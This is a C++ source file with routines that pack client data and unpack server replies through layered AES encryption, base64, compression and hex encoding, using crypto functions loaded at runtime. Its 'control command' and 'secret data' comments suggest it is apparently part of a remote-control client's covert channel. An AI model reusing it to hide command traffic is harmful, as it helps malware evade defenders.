#include "stdafx.h"
#include "globalvars.h"
#include "PacketFactory.h"
#include "console.h"

/*
Description of function:
Pack some data date->->zip->hex()

input data of the function:
unsigned char* AllData - Any data

return:
NULL - is failed
char* if OK
*/
char* PackData(unsigned char* AllData)
{
	int iLen = 0, zippedLen = 0;
	if (hModuleCRYPT == NULL) return NULL;
	if (AllData == NULL) return NULL;

	char* ZippedChars = NULL;
	char* hexed = NULL;

    ConsoleOutput(__FILE__, __FUNCTION__, __LINE__, "Begin.", 3);

	compress_stringC = (compress_stringCExp)GetProcAddress(hModuleCRYPT, "compress_stringC");
	if (compress_stringC == NULL) return NULL;

	char2charHex = (char2charHexExp)GetProcAddress(hModuleCRYPT, "char2charHex");
	if (char2charHex == NULL) return NULL;

	iLen = strlen((char*)AllData);
	ZippedChars = compress_stringC((char*)AllData, iLen, zippedLen);

	if (ZippedChars == NULL)
	{
        ConsoleOutput(__FILE__,__FUNCTION__, __LINE__,"compress_string error.", 1);
		return NULL;
	}

	hexed = char2charHex((unsigned char*)ZippedChars, zippedLen);
	VirtualFree(ZippedChars, 0, MEM_RELEASE);

	if (hexed == NULL)
	{
        ConsoleOutput(__FILE__,__FUNCTION__, __LINE__,"char2charHex error.", 1);
		return NULL;
	}
	return hexed;
}


/*
Description of function:
Decrypt server date->unbase64->unzip->decrypt()

input data of the function:
char* ServerAnswer - Server data for client
unsigned char* AESKey - aes key for crypt
unsigned char* AESVector - aes vector for crypt

return:
NULL - is failed
unsigned char* if OK
*/
unsigned char* DecryptServerPacket( char* ServerAnswer, unsigned char* AESKey, unsigned char* AESVector )
{
	int iLen = 0, iTmp = 0, cryptedLen = 0, zippedLen = 0;
	if (AESKey == NULL) return NULL;
	if (AESVector == NULL) return NULL;
	if (hModuleCRYPT == NULL) return NULL;
	if (ServerAnswer == NULL) return NULL;
	unsigned char* AESKeyNew = NULL;
	unsigned char* AESVectorNew = NULL;
	unsigned char* AllData = NULL;
	unsigned char *DecryptedData = NULL;
	char* unZippedChars = NULL;

    ConsoleOutput(__FILE__, __FUNCTION__, __LINE__, "Begin.", 3);

	aes256_decryptC = (aes256_decryptCExp)GetProcAddress(hModuleCRYPT, "aes256_decryptC");
	if (aes256_decryptC == NULL) return NULL;

	base64Decode = (base64DecodeExp)GetProcAddress(hModuleCRYPT, "base64Decode");
	if (base64Decode == NULL) return NULL;

	decompress_stringC = (decompress_stringCExp)GetProcAddress(hModuleCRYPT, "decompress_stringC");
	if (decompress_stringC == NULL) return NULL;

	unsigned char* debase64 = NULL;
	size_t sLen = strlen(ServerAnswer);
	iLen = base64Decode(ServerAnswer, sLen, &debase64);
	
	if (debase64 == NULL)
	{
        ConsoleOutput(__FILE__,__FUNCTION__, __LINE__,"Server answer base64Decode error.", 1);
		return NULL;
	}

	int unzippedLen = 0;
	unZippedChars = decompress_stringC((char*)debase64, iLen, unzippedLen);
	VirtualFree(debase64, 0, MEM_RELEASE);
	if (unZippedChars == NULL)
	{
        ConsoleOutput(__FILE__,__FUNCTION__, __LINE__,"Server answer decompress_string error.", 1);
		return NULL;
	}
    if (unzippedLen == 0)
    {
        ConsoleOutput(__FILE__,__FUNCTION__, __LINE__,"Server answer size is 0.", 1);
        return NULL;
    }
	sLen = unzippedLen;
	debase64 = NULL;
	iLen = base64Decode(unZippedChars, sLen, &debase64);
	VirtualFree(unZippedChars, 0, MEM_RELEASE);
	if (debase64 == NULL)
	{
        ConsoleOutput(__FILE__,__FUNCTION__, __LINE__,"Server answer base64Decode error.", 1);
		return NULL;
	}

	int decryptedLen = 0;
	DecryptedData = aes256_decryptC(debase64, iLen, AESKey, AESVector, decryptedLen);
	VirtualFree(debase64, 0, MEM_RELEASE);

	return DecryptedData;
}

/*
Description of function:
Prepare client date->crypt->base64->comand:userid:base64->zip->hex()

input data of the function:
unsigned char* ClientData - client data for server
unsigned char* UserID -client userid
unsigned char* AESKey - aes key for crypt
unsigned char* AESVector - aes vector for crypt
char* Command - control command for the server

return:
NULL - is failed
unsigned char* if OK
*/
unsigned char* PackClientPacket( unsigned char* ClientData, unsigned char* UserID, unsigned char* AESKey, unsigned char* AESVector, char* Command )
{
	int iLen = 0, iTmp = 0, cryptedLen = 0, zippedLen = 0;
	if (UserID == NULL) return NULL;
	if (AESKey == NULL) return NULL;
	if (AESVector == NULL) return NULL;
	if (ClientData == NULL) return NULL;
	if (UserID == NULL) return NULL;
	if (Command == NULL) return NULL;
	if (hModuleCRYPT == NULL) return NULL;
	unsigned char* AESKeyNew = NULL;
	unsigned char* AESVectorNew = NULL;
	unsigned char *cpp_cipher = NULL;
	unsigned char* AllData = NULL;
	char* base64str = NULL;
	char* ZippedChars = NULL;
	char* hexed = NULL;

    ConsoleOutput(__FILE__, __FUNCTION__, __LINE__, "Begin.", 3);

	aes256_encryptC = (aes256_encryptCExp)GetProcAddress(hModuleCRYPT, "aes256_encryptC");
	if (aes256_encryptC == NULL) return NULL;

	base64Encode = (base64EncodeExp)GetProcAddress(hModuleCRYPT, "base64Encode");
	if (base64Encode == NULL) return NULL;

	compress_stringC = (compress_stringCExp)GetProcAddress(hModuleCRYPT, "compress_stringC");
	if (compress_stringC == NULL) return NULL;

	char2charHex = (char2charHexExp)GetProcAddress(hModuleCRYPT, "char2charHex");
	if (char2charHex == NULL) return NULL;

	iLen = strlen((char*)ClientData);
	cpp_cipher = aes256_encryptC(ClientData, iLen, AESKey, AESVector, cryptedLen);

	if (cpp_cipher == NULL)
	{
        ConsoleOutput(__FILE__,__FUNCTION__, __LINE__,"aes256_encrypt error.", 1);
		return NULL;
	}

	base64str = base64Encode(cpp_cipher, cryptedLen);
	VirtualFree(cpp_cipher, 0, MEM_RELEASE);

	if (base64str == NULL)
	{
        ConsoleOutput(__FILE__,__FUNCTION__, __LINE__,"base64Encode error.", 1);
		return NULL;
	}

	iLen = strlen(base64str) + strlen((char*)UserID) + strlen(Command) + 64;
	AllData = (unsigned char*)VirtualAlloc(NULL, iLen, MEM_COMMIT, PAGE_READWRITE);
	if (AllData == NULL)
	{
        ConsoleOutput(__FILE__,__FUNCTION__, __LINE__,"VirtualAlloc error.", 1);
		VirtualFree(base64str, 0, MEM_RELEASE);
		return NULL;
	}

	//command:userid:CRYPTED_SECRETDATA_IN_BASE64
	_snprintf((char*)AllData, (iLen - 4), "%s:%s:%s", Command, (char*)UserID, base64str);
	VirtualFree(base64str, 0, MEM_RELEASE);

	iLen = strlen((char*)AllData);
	ZippedChars = compress_stringC((char*)AllData, iLen, zippedLen);
	VirtualFree(AllData, 0, MEM_RELEASE);

	if (ZippedChars == NULL)
	{
        ConsoleOutput(__FILE__,__FUNCTION__, __LINE__,"compress_string error.", 1);
		return NULL;
	}

	hexed = char2charHex((unsigned char*)ZippedChars, zippedLen);
	VirtualFree(ZippedChars, 0, MEM_RELEASE);

	if (hexed == NULL)
	{
        ConsoleOutput(__FILE__,__FUNCTION__, __LINE__,"char2charHex error.", 1);
		return NULL;
	}

	iLen = strlen(hexed) + 64;
	AllData = (unsigned char*)VirtualAlloc(NULL, iLen, MEM_COMMIT, PAGE_READWRITE);
	if (AllData == NULL)
	{
        ConsoleOutput(__FILE__,__FUNCTION__, __LINE__,"VirtualAlloc error.", 1);
		VirtualFree(hexed, 0, MEM_RELEASE);
		return NULL;
	}

	//var=Compressed_PacketForServer_IN_BASE64
	_snprintf((char*)AllData, (iLen - 4), "var=%s", hexed);
	VirtualFree(hexed, 0, MEM_RELEASE);

	return AllData;
}